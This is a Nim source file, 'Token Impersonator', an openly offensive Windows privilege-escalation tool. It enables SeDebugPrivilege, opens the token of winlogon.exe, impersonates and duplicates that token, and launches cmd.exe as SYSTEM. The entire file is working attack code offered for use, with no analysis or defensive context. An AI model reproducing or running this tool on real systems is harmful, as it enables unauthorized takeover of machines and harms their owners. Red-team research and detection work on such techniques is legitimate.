#[
    [Token Impersonator by @bofheaded]
    Original Author - https://gist.github.com/S3cur3Th1sSh1t/bb17ba24b04668edba75fda4e044f19a
]#
import winim
import winim/lean
import winim/inc/windef
import winim/inc/winbase
import winim/inc/objbase
import os

echo "\n[Token Impersonator by @bofheaded]"

var
    tp : TOKEN_PRIVILEGES
    luid: LUID
    HTtoken, CurrentProcHandle, TempHandle, AccessToken, TokenHandle, DuplicateTokenHandle: HANDLE
    result,impersonateUser, duplicateToken, createProcess: bool
    username: string
    username_len: int
    pi : PROCESS_INFORMATION
    si : STARTUPINFO

proc SetPrivilege (HTtoken:HANDLE, lpszPrivilege:string, bEnablePrivilege:bool ): bool=
    if LookupPrivilegeValue(NULL, lpszPrivilege, &luid) == 0:
        echo "[-] LookupPrivilegeValue Failed : ",GetLastError()
        return false
    
    else:
        echo "[+] LookupPrivilegeValue Success!"
        
        if (bEnablePrivilege):
            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
        else:
            tp.Privileges[0].Attributes=0
        
        tp.PrivilegeCount = 1
        tp.Privileges[0].Luid = luid
        

        if AdjustTokenPrivileges(HTtoken, FALSE, &tp, cast[DWORD](sizeof(TOKEN_PRIVILEGES)), NULL, NULL) == 0:
            echo "[-] AdjustTokenPrivileges Failed : ",GetLastError()
            return false
        else: 
            echo "[+] AdjustTokenPrivileges Success!"
            return true
        
        #if (GetLastError() == ERROR_NOT_ALL_ASSIGNED):
        #    echo "[-] The token does not have the specific privileges."
        #    return False
        

#get PID -  https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/minidump_bin.nim
proc toString(chars: openArray[WCHAR]): string =
    result = ""
    for c in chars:
        if cast[char](c) == '\0':
            break
        result.add(cast[char](c))

proc GetProcPid(): int =
    var 
        entry: PROCESSENTRY32
        hSnapshot: HANDLE

    entry.dwSize = cast[DWORD](sizeof(PROCESSENTRY32))
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    defer: CloseHandle(hSnapshot)

    if Process32First(hSnapshot, addr entry):
        while Process32Next(hSnapshot, addr entry):
            if entry.szExeFile.toString == "winlogon.exe":
                return int(entry.th32ProcessID)

    return 0

let processId: int = GetProcPid()

#Get WinLogon.exe PID
if not bool(processId):
        echo "\n[X] Unable to find winlogon.exe"
        quit(1)
echo "\n[+] PID Winlogon.exe : ",processId

#Get Current Process Handle
CurrentProcHandle = GetCurrentProcess()
echo "[+] Current Process Handle : ",CurrentProcHandle

#Open Handle to Current Process
TempHandle = OpenProcessToken(CurrentProcHandle, TOKEN_ADJUST_PRIVILEGES, &AccessToken)
if TempHandle == 0:
    echo "[-] OpenProcessToken Failed : ", GetLastError()
    quit(1)

else:
    echo "[+] OpenProcessToken Success!"
    result = SetPrivilege(cast[HANDLE](AccessToken), "SeDebugPrivilege", true)

    if result == false:
        echo "[-] SeDebugPrivilege Failed to Enable."
    else:
        echo "[+] SeDebugPrivilege Enabled!"
        TempHandle = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, cast[DWORD](processId))
        if TempHandle == 0:
            echo "[-] Unable to Open HANDLE for Winlogon.exe"
        else:
            echo "[+] Got HANDLE to Winlogon.exe!"
            TempHandle = OpenProcessToken(TempHandle, TOKEN_DUPLICATE or TOKEN_ASSIGN_PRIMARY or TOKEN_QUERY, &TokenHandle)
            if TempHandle == 0:
                echo "[-] OpenProcessToken Failed : ",GetLastError()
            else:
                echo "[+] OpenProcessToken Success!"
                impersonateUser = ImpersonateLoggedOnUser(TokenHandle)
                if impersonateUser == false:
                    echo "[-] Impersonation to LoggedOn User Failed : ",GetLastError()
                else:
                    echo "[+] Impersonation to LoggedOn User Success!"
                    duplicateToken = DuplicateTokenEx(TokenHandle, TOKEN_ADJUST_DEFAULT or TOKEN_ADJUST_SESSIONID or TOKEN_QUERY or TOKEN_DUPLICATE or TOKEN_ASSIGN_PRIMARY, NULL, securityImpersonation, tokenPrimary, &DuplicateTokenHandle)
                    if duplicateToken == false:
                        echo "[-] Token Duplication Failed : ",GetLastError()
                    else:
                        echo "[+] Token Duplication Success!"
                        createProcess = CreateProcessWithTokenW(DuplicateTokenHandle, LOGON_WITH_PROFILE, "C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &si, &pi)
                        if createProcess == 0:
                            echo "[-] CreateProcessWithTokenW Failed : ",GetLastError()
                        else:
                            echo "[+] CreateProcessWithTokenW Success!"
                            echo "[~] All Done!"
